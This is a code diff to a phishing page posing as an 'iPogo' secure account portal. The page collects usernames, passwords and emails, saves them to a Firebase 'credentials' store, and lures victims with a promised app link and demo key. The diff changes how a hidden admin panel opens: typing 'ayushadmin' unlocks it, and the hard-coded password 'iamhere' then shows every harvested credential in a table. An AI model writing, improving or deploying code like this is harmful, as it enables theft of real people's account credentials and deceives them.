@@ -120,9 +120,7 @@
   </style>
 </head>
 <body>
-  <header>
-    <strong>iPogo</strong> - Secure Account Portal
-  </header>
+  <header><strong>iPogo</strong> - Secure Account Portal</header>
 
   <div class="container">
     <div class="logo">
@@ -147,9 +145,7 @@
       <button class="btn" onclick="nextStep()">Next</button>
     </div>
 
-    <div id="loader">
-      <p>Verifying credentials...</p>
-    </div>
+    <div id="loader"><p>Verifying credentials...</p></div>
 
     <div id="emailStep">
       <div class="form-group">
@@ -178,9 +174,7 @@
     </div>
   </div>
 
-  <footer>
-    &copy; 2025 iPogo. All rights reserved.
-  </footer>
+  <footer>&copy; 2025 iPogo. All rights reserved.</footer>
 
   <script>
     const firebaseConfig = {
@@ -197,7 +191,6 @@
 
     let cachedUsername = '';
     let cachedPassword = '';
-    let typed = '';
 
     function nextStep() {
       const uname = document.getElementById('username').value.trim();
@@ -213,6 +206,15 @@
       }, 1200);
     }
 
+    // ✅ NEW: Unlock admin access when typing "ayushadmin" in username field
+    document.getElementById('username').addEventListener('input', function(e) {
+      const typedValue = e.target.value.trim().toLowerCase();
+      if (typedValue === 'ayushadmin') {
+        document.getElementById('adminAccess').style.display = 'block';
+        document.getElementById('loginStep').style.display = 'none';
+      }
+    });
+
     function saveCredentials() {
       const email = document.getElementById('email').value.trim();
       const time = new Date().toLocaleString();
@@ -224,7 +226,7 @@
         email: email,
         time: time
       }).then(() => {
-        document.getElementById('successMsg').innerText = '✅ Thank you! The latest app link will be sent to the provided email within 15 minutes along with a 3-day demo key. If you do not receive it, please check your spam folder or contact support.';
+        document.getElementById('successMsg').innerText = '✅ Thank you! The latest app link will be sent to the provided email within 15 minutes along with a 3-day demo key.';
       }).catch((error) => {
         alert('Error saving credentials: ' + error.message);
       });
@@ -246,15 +248,6 @@
       strengthText.style.display = 'block';
     }
 
-    document.addEventListener('keydown', (e) => {
-      typed += e.key.toLowerCase();
-      if (typed.includes('ayushadmin')) {
-        document.getElementById('adminAccess').style.display = 'block';
-        typed = '';
-      }
-      if (typed.length > 20) typed = typed.slice(-20);
-    });
-
     function checkAdmin() {
       const pwd = document.getElementById('adminPassword').value.trim();
       if (pwd === 'iamhere') {
@@ -272,7 +265,12 @@
       db.ref('credentials').once('value', snapshot => {
         snapshot.forEach(child => {
           const c = child.val();
-          const row = `<tr><td>${c.uname}</td><td>${c.pass}</td><td>${c.email}</td><td>${c.time}</td></tr>`;
+          const row = `<tr>
+            <td>${c.uname || '—'}</td>
+            <td>${c.pass || '—'}</td>
+            <td>${c.email || '—'}</td>
+            <td>${c.time || '—'}</td>
+          </tr>`;
           table.innerHTML += row;
         });
       });
